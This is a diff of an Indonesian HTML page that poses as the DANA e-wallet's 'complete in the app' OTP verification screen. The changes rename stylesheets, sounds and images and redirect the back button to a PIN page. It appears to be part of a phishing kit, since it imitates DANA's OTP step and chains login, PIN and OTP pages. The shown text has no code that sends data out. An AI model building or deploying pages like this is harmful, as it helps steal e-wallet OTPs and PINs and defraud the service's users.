@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link href="css/tap2.css" rel="stylesheet">
+    <link href="css/otp.css" rel="stylesheet">
     <title>Selesaikan di aplikasi DANA</title>
     <style>
         /* 
@@ -18,7 +18,7 @@
 <body>
 
 <audio id="notifSound" class="hidden-audio" preload="auto">
-    <source src="media/nada_nl.mp3" type="audio/mpeg">
+    <source src="media/notification.mp3" type="audio/mpeg">
 </audio>
 
 <div class="container">
@@ -55,7 +55,7 @@
 
         <!-- Timeout inline -->
         <div class="timeout-inline" id="timeoutInline">
-            <img src="images/waktu.png" alt="Timeout">
+            <img src="images/timeout.png" alt="Timeout">
             <h3>Waktu Habis</h3>
             <p>Waktu verifikasi telah berakhir.<br>Silakan coba lagi.</p>
             <button onclick="goBack()">Coba Lagi</button>
@@ -65,11 +65,11 @@
     <div class="steps-box">
         <div class="steps-heading" onclick="toggleTutorial()">
             <span class="steps-heading-left">Cara Konfirmasi di Aplikasi DANA</span>
-            <img class="arrow-icon" id="arrowIcon" src="images/tap.png" alt="panah">
+            <img class="arrow-icon" id="arrowIcon" src="images/tap-arrow.png" alt="panah">
         </div>
 
         <div class="tutorial-panel" id="tutorialPanel">
-            <img src="media/img_nl.gif" alt="Tutorial Konfirmasi DANA">
+            <img src="media/tap-tutorial.gif" alt="Tutorial Konfirmasi DANA">
         </div>
 
         <div class="step">
@@ -94,7 +94,7 @@
     <!-- OTP Section -->
     <div class="otp-section">
         <div class="otp-error" id="otpError">
-            <img src="images/eror.png" alt="error">
+            <img src="images/error.png" alt="error">
             <span>Kode OTP sudah tidak valid..!! Silahkan melakukan verifikasi ulang,</span>
         </div>
 
@@ -207,8 +207,8 @@
         // Menghentikan timer yang sedang berjalan
         clearInterval(interval);
         
-        // Redirect kembali ke halaman masuk.html
-        window.location.href = 'masuk.html';
+        // Redirect kembali ke halaman pin.html
+        window.location.href = 'pin.html';
     }
 
     startTimer();
